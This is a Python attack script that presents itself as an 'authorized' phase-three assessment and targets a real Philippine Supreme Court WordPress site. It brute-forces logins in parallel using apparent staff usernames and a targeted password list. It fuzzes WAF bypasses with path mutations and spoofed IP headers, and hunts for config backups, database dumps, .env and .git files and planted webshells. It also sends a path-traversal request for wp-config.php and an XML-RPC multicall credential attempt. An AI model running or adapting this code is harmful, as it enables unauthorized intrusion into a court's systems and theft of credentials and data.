#!/usr/bin/env python3
"""
Phase 3 — Aggressive authorized offensive assessment.
Parallel brute force, backup hunting, plugin CVE probes, deep bypass fuzz.
"""

import json
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from itertools import product

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = 'https://sc.judiciary.gov.ph'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
HEADERS = {'User-Agent': UA}

USERS = ['scweb', 'pio_tyke', 'pio_jerome', 'tyke-test-admin', 'pio_rus', 'admin', 'administrator', 'webmaster']

# Top rockyou-style + gov/WP targeted (expanded)
PASSWORDS = list(dict.fromkeys([
    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567',
    'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master',
    '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman',
    '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
    'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew',
    'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger',
    'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper',
    'admin', 'admin123', 'admin1234', 'admin12345', 'administrator', 'root', 'toor', 'pass', 'test',
    'guest', 'info', 'adm', 'mysql', 'user', 'administrator1', 'Admin123', 'Admin1234', 'Admin@123',
    'Password1', 'Password123', 'Password123!', 'P@ssw0rd', 'P@ssword', 'P@ssw0rd!', 'Passw0rd',
    'Welcome1', 'Welcome123', 'Changeme1', 'Changeme123', 'Default123', 'Temp1234', 'Qwerty123',
    'Qwerty123!', 'Abc12345', 'Abc123456', 'Test1234', 'Demo1234', 'Login123', 'Access123',
    'scweb', 'scweb1', 'scweb12', 'scweb123', 'scweb1234', 'Scweb123', 'Scweb123!', 'SCweb123',
    'SCweb2024', 'SCweb2025', 'scweb2024', 'scweb2025', 'scweb@123', 'scweb!', 'scwebadmin',
    'judiciary', 'Judiciary', 'Judiciary1', 'Judiciary123', 'Judiciary@123', 'judiciary123',
    'Judiciary2024', 'Judiciary2025', 'supremecourt', 'SupremeCourt', 'SupremeCourt1',
    'SupremeCourt123', 'SupremeCourt2024', 'SupremeCourt2025', 'philippines', 'Philippines1',
    'Philippines123', 'Manila123', 'manila123', 'Manila@123', 'SCJudiciary1', 'SCJudiciary123',
    'pio_tyke', 'pio_tyke123', 'Pio_tyke123', 'PioTyke123', 'pio123', 'piojerome', 'PioJerome1',
    'pio_rus', 'PioRus123', 'RusNarito1', 'tyke', 'Tyke123', 'Tyke123!', 'tyke123', 'tyke2024',
    'tyke2025', 'Tyke2024', 'Tyke2025', 'tykeflores', 'TykeFlores1', 'TykeFlores123',
    'tyke-test-admin', 'tyke-test-admin123', 'Tyke-test-admin1', 'TykeTestAdmin', 'TykeTestAdmin1',
    'test-admin', 'testadmin', 'TestAdmin1', 'TestAdmin123', 'test123', 'Test123', 'demo', 'Demo',
    'wordpress', 'Wordpress1', 'Wordpress123', 'WordPress123', 'wp-admin', 'wpadmin', 'WpAdmin123',
    'webmaster', 'Webmaster1', 'Webmaster123', 'webmaster123', 'support', 'Support123',
    'Summer2024', 'Summer2025', 'Winter2024', 'Winter2025', 'Spring2024', 'Spring2025',
    'Fall2024', 'January2025', 'February2025', 'March2025', 'April2025', 'May2025',
    '2024!', '2025!', '2024@', '2025@', '2024#', '2025#', '@2024', '@2025',
    'sc.judiciary.gov.ph', 'scjudiciary', 'SCjudiciary1', 'sc@2024', 'sc@2025',
    'Welcome@123', 'Admin@2024', 'Admin@2025', 'Password@1', 'Password@123', 'Pass@1234',
    'qwe123', 'asd123', 'zxc123', '1q2w3e4r', '1q2w3e4r5t', 'q1w2e3r4', 'zaq12wsx',
    'Pass1234', 'pass1234', 'pass123', 'secret', 'Secret123', 'login', 'Login1234',
    'changeme', 'ChangeMe123', 'newpass', 'newpass123', 'reset123', 'Setup123', 'Install123',
    'scweb@2024', 'scweb@2025', 'pio@123', 'jerome123', 'Jerome123!', 'rus123', 'Rus123!',
    'Flores123', 'flores123', 'tykepio', 'TykePio1', 'SCweb@123', 'SC@web123',
]))

LOGIN_PATHS = [
    '/wp-login.php', '/wp%2Dlogin.php', '/wp%2dlogin.php',
    '/wp%252Dlogin.php', '/wp%2Dlogin%2ephp', '/%77p-login.php',
    '/wp-login.php/', '/wp-login.php?', '/wp-login.php%3f',
    '/wp-login.php?redirect_to=https%3A%2F%2Fsc.judiciary.gov.ph%2Fwp-admin%2F',
    '/wp%2Dlogin.php?redirect_to=https%3A%2F%2Fsc.judiciary.gov.ph%2Fwp-admin%2F',
    '/wp-login.php?reauth=1', '/wp-login.php?interim-login=1',
    '/wp-login.php/..;/wp-login.php', '/wp-login.php/..%2fwp-login.php',
    '/Wp-login.php', '/WP-LOGIN.PHP', '/wp-login.PHP',
    '/wp-login%2ephp', '/wp-login%2Ephp',
    '/wp-admin/install.php', '/wp-admin/upgrade.php',
]

BACKUP_PATHS = [
    '/wp-config.php.bak', '/wp-config.bak', '/wp-config.old', '/wp-config.txt',
    '/wp-config.php.old', '/wp-config.php.save', '/wp-config.php~', '/wp-config.php.swp',
    '/wp-config.php.orig', '/wp-config.php.backup', '/wp-config.php.dist',
    '/.wp-config.php.swp', '/wp-config-sample.php', '/wp-config.inc',
    '/backup.zip', '/backup.tar.gz', '/backup.sql', '/backup.sql.gz',
    '/db.sql', '/database.sql', '/dump.sql', '/site.zip', '/www.zip',
    '/wordpress.zip', '/wp.zip', '/sc.zip', '/scweb.zip', '/judiciary.zip',
    '/wp-content/backup-db/', '/wp-content/backups/', '/wp-content/backups-dup-lite/',
    '/wp-content/backups-dup-lite/tmp/', '/wp-content/backups-dup-pro/',
    '/wp-content/updraft/', '/wp-content/uploads/backups/',
    '/wp-content/uploads/backup/', '/wp-content/uploads/backwpup/',
    '/wp-content/ai1wm-backups/', '/wp-snapshots/', '/dup-installer/',
    '/wp-content/debug.log', '/error_log', '/error.log', '/php_error.log',
    '/.env', '/.env.backup', '/.env.local', '/.git/HEAD', '/.git/config',
    '/.svn/entries', '/.DS_Store', '/web.config', '/server-status',
    '/wp-content/uploads/wp-file-manager-pro/', '/wp-content/uploads/file-manager/',
    '/shell.php', '/wp-content/uploads/shell.php', '/wp-content/uploads/2024/shell.php',
    '/wp-content/uploads/2025/shell.php', '/wp-content/uploads/2026/shell.php',
    '/c99.php', '/r57.php', '/wso.php', '/x.php', '/1.php',
    '/wp-content/mu-plugins/', '/readme.html', '/license.txt',
]

PLUGIN_EXPLOITS = [
    ('GET', '/wp-content/plugins/wpdatatables/assets/js/wpdatatables/wdt.min.js', None),
    ('GET', '/wp-json/wpdatatables/v1/get_table_data?table_id=1', None),
    ('GET', '/wp-json/wpdatatables/v1/get_table_data?table_id=1&table_type=mysql', None),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'wpdatatables_get_json_file', 'table_id': '1'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'ht_mega_ajax_request', 'type': 'init'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'ht_mega_load_demo', 'demo_id': '1'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'eael_get_token'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'royal_elementor_addons_ajax', 'type': 'init'}),
    ('GET', '/wp-content/plugins/ht-mega-for-elementor/readme.txt', None),
    ('GET', '/wp-content/plugins/wpdatatables/readme.txt', None),
    ('GET', '/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt', None),
    ('GET', '/wp-content/plugins/powerpack-lite-for-elementor/readme.txt', None),
    ('GET', '/wp-content/plugins/royal-elementor-addons/readme.txt', None),
    ('GET', '/wp-content/plugins/header-footer-elementor/readme.txt', None),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'duplicator_download', 'file': '../../../wp-config.php'}),
    ('GET', '/wp-content/backups-dup-lite/', None),
    ('GET', '/wp-content/backups-dup-lite/index.php', None),
    ('GET', '/installer.php', None),
    ('GET', '/dup-installer/main.installer.php', None),
    ('POST', '/xmlrpc.php', '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>scweb</string></value><value><string>admin</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>'),
    ('GET', '/?author=1', None), ('GET', '/?author=2', None), ('GET', '/?author=204', None),
    ('GET', '/wp-json/wp/v2/users/1?_fields=id,slug,name,email', None),
    ('GET', '/wp-json/wp/v2/users?_fields=id,slug,name,email&per_page=100', None),
    ('GET', '/wp-json/wp/v2/posts?per_page=1&_fields=id,title,content', None),
    ('GET', '/wp-json/batch/v1', None),
]

_lock = threading.Lock()
_success = {'hit': None}


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    return s


def is_login_page(text):
    t = (text or '').lower()
    return 'user_login' in t and ('wp-submit' in t or 'log in' in t)


def try_login(user, pwd, path):
    if _success['hit']:
        return None
    url = BASE + path
    try:
        s = sess()
        r = s.post(url, data={
            'log': user, 'pwd': pwd, 'wp-submit': 'Log In',
            'redirect_to': BASE + '/wp-admin/', 'testcookie': '1',
        }, timeout=12, allow_redirects=False)
        if r.status_code == 403:
            return {'blocked': path}
        logged = any('wordpress_logged_in' in c.name for c in s.cookies)
        redir = r.status_code in (301, 302, 303) and 'wp-admin' in r.headers.get('Location', '')
        t = (r.text or '').lower()
        if logged or redir:
            hit = {'user': user, 'password': pwd, 'path': path, 'status': r.status_code}
            with _lock:
                _success['hit'] = hit
            return {'success': hit}
        if 'incorrect password' in t or 'invalid password' in t or 'the password you entered' in t:
            return {'valid_user': user, 'path': path}
        if 'invalid username' in t or 'unknown username' in t:
            return {'invalid_user': user}
    except requests.RequestException:
        pass
    return None


def parallel_brute(workers=20):
    results = {'success': None, 'valid_users': set(), 'open_paths': set(), 'blocked_paths': set(), 'attempts': 0}
    # First find open login paths via GET
    open_paths = []
    s = sess()
    for path in LOGIN_PATHS:
        try:
            r = s.get(BASE + path, timeout=10, allow_redirects=False)
            if r.status_code == 200 and is_login_page(r.text):
                open_paths.append(path)
                results['open_paths'].add(path)
            elif r.status_code != 403:
                # POST might work even if GET doesn't show login form
                open_paths.append(path)
        except requests.RequestException:
            pass
        time.sleep(0.05)
    if not open_paths:
        open_paths = LOGIN_PATHS  # spray all anyway

    combos = list(product(USERS, PASSWORDS, open_paths))
    results['attempts'] = len(combos)
    print(f'    Brute: {len(USERS)} users x {len(PASSWORDS)} pwds x {len(open_paths)} paths = {len(combos)} attempts, {workers} workers')

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(try_login, u, p, path): (u, p, path) for u, p, path in combos}
        done = 0
        for fut in as_completed(futs):
            if _success['hit']:
                break
            done += 1
            if done % 500 == 0:
                print(f'    ... {done}/{len(combos)}')
            try:
                r = fut.result()
                if r and 'success' in r:
                    results['success'] = r['success']
                    break
                if r and 'valid_user' in r:
                    results['valid_users'].add(r['valid_user'])
                    results['open_paths'].add(r['path'])
                if r and 'blocked' in r:
                    results['blocked_paths'].add(r['blocked'])
            except Exception:
                pass
    results['valid_users'] = list(results['valid_users'])
    results['open_paths'] = list(results['open_paths'])
    results['blocked_paths'] = list(results['blocked_paths'])
    return results


def hunt_backups(workers=15):
    hits = []
    def probe(path):
        try:
            r = requests.get(BASE + path, headers=HEADERS, verify=False, timeout=10, allow_redirects=False)
            if r.status_code == 200 and len(r.text or '') > 20:
                entry = {'path': path, 'status': 200, 'len': len(r.text)}
                ct = r.headers.get('Content-Type', '')
                entry['content_type'] = ct
                if 'sql' in path or 'DB_NAME' in (r.text or '') or 'define(' in (r.text or ''):
                    entry['sensitive'] = True
                    entry['snippet'] = (r.text or '')[:300]
                elif 'zip' in path or 'octet' in ct:
                    entry['sensitive'] = True
                elif 'debug' in path and ('PHP' in (r.text or '') or 'error' in (r.text or '').lower()):
                    entry['sensitive'] = True
                    entry['snippet'] = (r.text or '')[:300]
                elif '.git' in path:
                    entry['sensitive'] = True
                    entry['snippet'] = (r.text or '')[:200]
                if entry.get('sensitive') or ('text' in ct and len(r.text) > 100 and 'html' not in ct):
                    return entry
            elif r.status_code == 403 and path.endswith('.sql'):
                return {'path': path, 'status': 403, 'exists_probably': True}
        except requests.RequestException:
            pass
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        for r in ex.map(probe, BACKUP_PATHS):
            if r:
                hits.append(r)
    return hits


def plugin_exploits():
    results = []
    for item in PLUGIN_EXPLOITS:
        method, path, data = item[0], item[1], item[2] if len(item) > 2 else None
        try:
            if method == 'GET':
                r = requests.get(BASE + path, headers=HEADERS, verify=False, timeout=12, allow_redirects=False)
            else:
                hdrs = {**HEADERS}
                if isinstance(data, str):
                    hdrs['Content-Type'] = 'application/xml'
                    r = requests.post(BASE + path, data=data, headers=hdrs, verify=False, timeout=12)
                else:
                    r = requests.post(BASE + path, data=data, headers=hdrs, verify=False, timeout=12)
            entry = {'method': method, 'path': path, 'status': r.status_code, 'len': len(r.text or '')}
            if r.status_code == 200:
                if 'readme' in path:
                    v = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.I)
                    if v:
                        entry['version'] = v.group(1)
                elif 'json' in r.headers.get('Content-Type', ''):
                    try:
                        entry['json'] = r.json()
                    except Exception:
                        entry['snippet'] = (r.text or '')[:400]
                elif len(r.text or '') < 2000:
                    entry['snippet'] = (r.text or '')[:400]
                else:
                    entry['snippet'] = (r.text or '')[:200]
            results.append(entry)
        except requests.RequestException as e:
            results.append({'path': path, 'error': str(e)[:60]})
        time.sleep(0.08)
    return results


def aggressive_bypass_fuzz():
    extra = []
    mutations = [
        '/wp-login.php', '/wp%2Dlogin.php',
        '/wp-login.php%00', '/wp-login.php%0a', '/wp-login.php%0d%0a',
        '/wp-login.php%20', '/wp-login.php%09', '/wp-login.php%2f%2f',
        '/./wp-login.php', '/./wp%2Dlogin.php',
        '/wp-login.php/.', '/wp-login.php/..',
        '/wp-login.php/..%00/', '/wp-login.php/..%00/..%00/wp-login.php',
        '/wp-login.php/....//....//wp-login.php',
        '/wp-login.php/..%252fwp-login.php',
        '/wp%252Dlogin.php', '/wp%25252Dlogin.php',
        '/wp%2Dlogin%252Ephp', '/wp%2Dlogin%2ephp',
        '/%77p%2Dlogin.php', '/%77p%2dlogin.php',
        '/wp%2dlogin%2ephp', '/wp%2DLOGIN%2EPHP',
        '/wp-login.php%23', '/wp-login.php%3b',
        '/wp-login.php%5c', '/wp-login.php%2e',
        '/wp-login.php;', '/wp-login.php::', '/wp-login.php\\',
        '/wp-login.php%00.php', '/wp-login.php.shtml',
        '/wp-login.php/avatar', '/wp-login.php/favicon.ico',
    ]
    header_sets = [
        {'X-Original-URL': '/wp-login.php'},
        {'X-Rewrite-URL': '/wp-login.php'},
        {'X-Forwarded-For': '127.0.0.1, 10.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'Client-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Host': '127.0.0.1'},
        {'X-Forwarded-Server': 'localhost'},
        {'Referer': BASE + '/wp-admin/'},
        {'Origin': BASE},
    ]
    s = sess()
    for path in mutations:
        try:
            r = s.get(BASE + path, timeout=8, allow_redirects=False)
            if r.status_code == 200 and is_login_page(r.text):
                extra.append({'type': 'path', 'path': path, 'status': 200})
        except requests.RequestException:
            pass
    for hdrs in header_sets:
        for path in ['/wp-login.php', '/wp%2Dlogin.php']:
            try:
                h = {**HEADERS, **hdrs}
                r = requests.get(BASE + path, headers=h, verify=False, timeout=8, allow_redirects=False)
                if r.status_code == 200 and is_login_page(r.text):
                    extra.append({'type': 'header', 'path': path, 'headers': hdrs})
            except requests.RequestException:
                pass
    return extra


def main():
    t0 = time.time()
    print('[1/4] Aggressive WAF bypass fuzz...')
    bypass = aggressive_bypass_fuzz()
    print(f'    Bypass hits: {len(bypass)}')

    print('[2/4] Parallel brute force (20 workers)...')
    brute = parallel_brute(workers=20)
    if brute.get('success'):
        print(f'    *** CREDENTIAL HIT: {brute["success"]} ***')
    else:
        print(f'    No creds. Valid users via login errors: {brute.get("valid_users")}')
        print(f'    Open paths: {brute.get("open_paths")}')

    print('[3/4] Backup/sensitive file hunt...')
    backups = hunt_backups()
    print(f'    Sensitive hits: {len(backups)}')

    print('[4/4] Plugin exploit probes...')
    exploits = plugin_exploits()
    interesting = [e for e in exploits if e.get('status') == 200 and e.get('len', 0) > 0]
    print(f'    Interesting responses: {len(interesting)}')

    report = {
        'meta': {
            'target': BASE,
            'phase': 3,
            'mode': 'aggressive',
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'elapsed_sec': round(time.time() - t0, 1),
        },
        'bypass_hits': bypass,
        'brute_force': brute,
        'backup_hits': backups,
        'plugin_exploits': exploits,
        'plugin_interesting': interesting,
    }
    out = 'readyTouse/phase3-aggressive.json'
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, default=str)

    print(json.dumps({
        'elapsed': report['meta']['elapsed_sec'],
        'bypass_hits': len(bypass),
        'brute_attempts': brute.get('attempts'),
        'credential_hit': brute.get('success'),
        'valid_users': brute.get('valid_users'),
        'backup_hits': len(backups),
        'plugin_hits': len(interesting),
    }, indent=2))
    print(f'\n[+] {out}')


if __name__ == '__main__':
    main()
